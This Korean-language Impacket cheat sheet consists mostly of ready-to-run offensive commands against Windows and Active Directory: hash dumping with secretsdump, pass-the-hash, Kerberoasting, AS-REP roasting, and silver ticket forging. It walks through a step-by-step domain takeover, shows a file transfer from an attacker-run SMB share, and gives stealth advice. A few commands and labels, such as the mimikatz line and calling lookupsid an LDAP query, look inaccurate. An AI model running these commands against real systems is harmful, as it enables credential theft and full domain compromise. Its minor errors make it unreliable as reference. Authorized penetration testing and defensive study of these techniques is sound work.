# Impacket 사용 가이드

## 설치

```bash
# 기본 설치
pip3 install impacket

# GitHub에서 최신 버전 설치
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install -r requirements.txt
python3 setup.py install

# Kali에서 설치
sudo apt-get install python3-impacket
```

## 주요 도구

### SMB 관련 도구

```bash
# SMB 서버 실행 (파일 공유용)
sudo impacket-smbserver share /tmp/share -smb2support

# 비밀번호 있는 SMB 서버 실행
sudo impacket-smbserver share /tmp/share -smb2support -username user -password password

# PsExec로 원격 명령 실행
impacket-psexec administrator:password@10.10.10.10

# SMB 클라이언트
impacket-smbclient domain/username:password@10.10.10.10
```

### 인증 관련 도구

```bash
# 해시 덤프 (SAM 파일)
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# 원격 시스템에서 해시 덤프
impacket-secretsdump domain/username:password@10.10.10.10

# PTH(Pass-The-Hash) 공격
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.10
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.10
```

### Kerberos 관련 도구

```bash
# Kerberoasting
impacket-GetUserSPNs domain/username:password -dc-ip 10.10.10.10 -request

# AS-REP Roasting (사전 인증 없는 계정)
impacket-GetNPUsers domain/ -usersfile usernames.txt -dc-ip 10.10.10.10

# Kerberos 티켓 덤프
impacket-mimikatz -k sekurlsa::tickets

# Silver 티켓 생성
impacket-ticketer -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain> -spn <service_spn> <username>
```

### 원격 실행 도구

```bash
# WMI로 원격 명령 실행 (덜 눈에 띔)
impacket-wmiexec domain/username:password@10.10.10.10 "whoami"

# DCOM을 통한 원격 실행
impacket-dcomexec domain/username:password@10.10.10.10

# MSSQL 서버 원격 명령 실행
impacket-mssqlclient domain/username:password@10.10.10.10 -windows-auth
```

### 기타 유용한 도구

```bash
# MSSQL 서버에 인증 및 쿼리 실행
impacket-mssqlclient username:password@10.10.10.10
impacket-mssqlclient -windows-auth domain/username:password@10.10.10.10

# RPC 클라이언트
impacket-rpcdump domain/username:password@10.10.10.10

# LDAP 쿼리
impacket-lookupsid domain/username:password@10.10.10.10
```

## 자주 사용하는 시나리오

### Active Directory 침투 시나리오

```bash
# 1. 도메인 컨트롤러 찾기
impacket-netview -domain example.local

# 2. 사용자 열거
impacket-lookupsid domain/username:password@10.10.10.10

# 3. AS-REP Roasting
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# 4. Kerberoasting
impacket-GetUserSPNs domain/username:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# 5. 해시 크래킹 후 PTH 공격
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 domain/administrator@10.10.10.10

# 6. 도메인 컨트롤러에서 모든 비밀번호 해시 추출
impacket-secretsdump domain/administrator:password@10.10.10.10
```

### 파일 전송 시나리오

```bash
# 1. SMB 서버 실행
sudo impacket-smbserver share /tmp/share -smb2support

# 2. 윈도우 측에서 접근 (cmd)
copy \\<kali-ip>\share\file.exe C:\temp\file.exe

# 3. PowerShell을 이용한 파일 전송
Copy-Item -Path "\\<kali-ip>\share\file.exe" -Destination "C:\temp\file.exe"
```

## 팁과 주의사항

- 대부분의 impacket 도구는 `-debug` 옵션 지원 (문제 해결 시 유용)
- 해시 포맷: `LM:NT` 또는 `aad3b435b51404eeaad3b435b51404ee:NT해시값`
- 도메인 컨트롤러 IP는 `-dc-ip` 옵션으로 명시
- `-k` 옵션으로 Kerberos 인증 사용 가능
- 항상 상대방 시스템에 로그를 남긴다는 점 유의
- 원격 실행 시 wmiexec가 가장 스텔스한 방법
